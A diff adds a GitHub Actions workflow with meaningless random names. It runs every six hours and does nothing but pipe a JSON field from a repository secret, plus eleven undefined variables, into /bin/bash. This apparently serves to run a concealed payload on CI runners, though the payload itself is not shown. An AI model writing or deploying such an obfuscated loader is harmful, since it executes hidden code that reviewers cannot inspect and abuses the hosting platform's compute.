@@ -1,0 +1,29 @@
+name: didaren7651
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '8 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: didaren7651
+        env:
+          misiv9: ${{ secrets.misiv9 }}
+        run: |
+          echo $misiv9 | jq -r .vrb0184 | /bin/bash
+          echo $a19507 | jq -r .zksxn5432 | /bin/bash
+          echo $cp93 | jq -r .icr4 | /bin/bash
+          echo $g05 | jq -r .ds9 | /bin/bash
+          echo $l07463 | jq -r .vt18 | /bin/bash
+          echo $awpui9 | jq -r .djua7460 | /bin/bash
+          echo $y3314 | jq -r .kr68 | /bin/bash
+          echo $qjnvo1863 | jq -r .bm66356 | /bin/bash
+          echo $mpil987 | jq -r .d593 | /bin/bash
+          echo $mqcu5 | jq -r .b887 | /bin/bash
+          echo $zd54 | jq -r .t41 | /bin/bash
+          echo $nrlc5 | jq -r .z82 | /bin/bash
+
